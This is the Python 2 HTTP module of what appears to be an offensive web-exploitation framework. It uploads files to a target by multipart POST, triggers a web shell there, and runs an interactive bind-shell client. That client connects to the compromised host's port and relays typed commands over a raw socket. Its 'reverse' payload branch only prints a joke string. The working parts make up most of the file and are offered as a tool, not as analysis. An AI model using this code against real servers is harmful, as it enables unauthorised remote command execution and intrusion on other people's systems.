'''
Created on Jul 27, 2012

@author: aeon
@attention: This is the HTTP library for the framework

'''
import sys
#import urllib
import urllib2
import httplib
#import base64
#import os
import MultipartPostHandler
import string
import random
import socket

import getpass
from threading import Thread
from time import sleep
from utils import bcolors

class webconnection(object):
    '''
    classdocs
    http://www.hackorama.com/python/upload.shtml
    '''

    def __init__(self):
        '''
        Constructor
        '''
        self.target        = ""
        self.target_os     = ""
        self.content_type  = None
        self.ssl           = False
        self.proxy         = None
        self.uripath       = None
        self.request_type  = None
        self.target_port   = 80     # assumed 80
        self.lport         = 0
        self.postparams    = {}
        self.headers       = { "Content-type": "application/x-www-form-urlencoded",
                               "Accept": "text/plain"  }
    
    def upload_to_url( self ):
     
        #self.postparams = urllib.urlencode(self.postparams)
        if self.proxy:
            conn = httplib.HTTPConnection( "%s" % (self.proxy) )
            if self.ssl:
                conn.request( "POST", "https://%s:%s%s" % 
                              (self.target, self.target_port, self.uripath), self.postparams, self.headers )
            elif not self.ssl:
                conn.request( "POST", "http://%s:%s%s" % 
                              (self.target, self.target_port, self.uripath), self.postparams, self.headers )
        elif not self.proxy:
            if self.ssl:
                conn = httplib.HTTPSConnection("%s:%s" % (self.target, self.target_port) )
            elif not self.ssl:
                conn = httplib.HTTPConnection( "%s:%s" % (self.target, self.target_port) )
            conn.request( "POST", self.uripath, self.postparams, self.headers )
        response = conn.getresponse( )
        # returns "True" or "False" if failed
        print response.read( )
        # status for debugging
        #print response.status
        conn.close( )
        
    #def do_upload( self ):
    #    urllib2.install_opener(urllib2.build_opener(MultipartPostHandler.MultipartPostHandler))
    #    response = urllib2.urlopen(urllib2.Request("%s:%s%s" % 
    #                                (self.target, self.target_port, self.uripath), self.postparams, self.headers))
    #    return response

    def print_error(self, text):
        print "%s%s%s" % (bcolors.FAIL, text, bcolors.ENDC)
        
    def set_lport(self, lport):
        self.lport = lport
        
    def isValidDir(self, s, cmd):
        s.send("pwd\n")
        result = s.recv(4096)
        dirpath = cmd.split(" ")[1]
        if ";" in dir:
            dirpath = dir.split(";")[0]
        elif "&&" in dir:
            dirpath = dir.split("&&")[0]
        if dirpath in result or ".." in dirpath:
            return True
        return False
    
    # linux only
    def getDir(self, s):
        s.send("pwd\n")
        result = s.recv(4096)
        return result.rstrip()        

    def do_bind_client(self):
        sockfd = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        try:
            sockfd = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        except socket.error , e:
            self.print_error("(-) Error while Creating socket : %s" % (e))
            sys.exit(1)
        try:
            sockfd.connect((self.target, int(self.lport)))
        except socket.error , e:
            self.print_error("(-) Error while connecting socket : %s" % (e))
            sys.exit(1)
            
        try:
            print ""
            while True:
                dirpath = ""
                if self.target_os == "linux":
                    cmd = raw_input("%s%s@%s%s %s[%s]%s$ " % 
                    (bcolors.OKBLUE, getpass.getuser(), self.target, bcolors.ENDC, bcolors.HEADER, self.getDir(sockfd), bcolors.ENDC))
                # need to test with %cd% on windows when I get a chance
                elif self.target_os == "":
                    cmd = raw_input("%s%s@%s%s $ " % (bcolors.OKBLUE, getpass.getuser(), self.target, bcolors.ENDC))  
                rawcmd = cmd.rstrip()
                cmd = rawcmd + "\n"
                
                data = ""
                sockfd.send(cmd)            

                if "cd" not in rawcmd: 
                    # max size to stdout is 1448 bytes
                    while True:
                        result = sockfd.recv(4096)
                        data += result
                        if len(result) > 1447:
                            sockfd.send("\n")            
                        else:
                            break
                    print data
                    if len(data) == 0:
                        sockfd.close()
                        break
                
                # only good for linux
                elif "cd" in rawcmd:
                    if self.target_os == "linux":
                        sockfd.send("pwd\n")
                        response = sockfd.recv(4096)
                        if self.isValidDir(sockfd, rawcmd):
                            dirpath = response.rstrip()
                            pass
                    
        except KeyboardInterrupt: #clean up code
                sockfd.shutdown(0)
                print("\n\n-------- Client Terminated ----------\n");


    def random(self, size=10, chars=string.ascii_uppercase + string.digits + string.ascii_uppercase.lower()):
        return ''.join(random.choice(chars) for x in range(size))

    def do_file_upload( self ):
        urllib2.install_opener(urllib2.build_opener(MultipartPostHandler.MultipartPostHandler))
        if self.ssl: # untested
            uri = "https://%s:%s%s" % (self.target, self.target_port, self.uripath)
        elif not self.ssl:
            uri = "http://%s:%s%s" % (self.target, self.target_port, self.uripath)
        req = urllib2.Request(uri, self.postparams, self.headers)
        if self.proxy:
            req.set_proxy("127.0.0.1:8080","http")
        response = urllib2.urlopen(req)
        return response

    def execute_web_shell(self, payloadtype):
        """
        This function handles the generation of threads and 
        handles teh shell
        """
        
        if self.ssl: # untested
            uri = "https://%s:%s%s" % (self.target, self.target_port, self.uripath)
        elif not self.ssl:
            uri = "http://%s:%s%s" % (self.target, self.target_port, self.uripath)
            #print uri
            
        req = urllib2.Request(uri, self.postparams, self.headers)
        if self.proxy:
            req.set_proxy("127.0.0.1:8080","http")
            
        if payloadtype == "bind":
            thread = Thread(target = urllib2.urlopen, args = (req, ))
            thread.start()
            sleep(2)
            self.do_bind_client()
        #elif payloadtype == "reverse":
            
            
        elif payloadtype == "reverse":
            print "HAHAHHAHAHAAHA now get back to work..."
            response = urllib2.urlopen(req)
        
        #return response
            
        
        
        
    def set_target(self, target):
        self.target = target
        
    def set_full_path(self, uripath):
        self.uripath = uripath
        
    def set_proxy(self, proxy):
        self.proxy = proxy
        
    def set_type(self, rtype):
        self.request_type = rtype
        
    def set_post_params(self, params):
        self.postparams = params 
    
    def set_content_type(self, content_type):
        if content_type == "multipart":
            self.request_type = "POST"
            self.content_type = "multipart/form-data"
        elif content_type == "form-urlencoded":
            self.request_type = "POST"
            self.content_type = "application/x-www-form-urlencoded"
        else:
            self.request_type = "GET"
        
    def run(self):
        #pass
        self.upload_to_url()
        
        
        
        
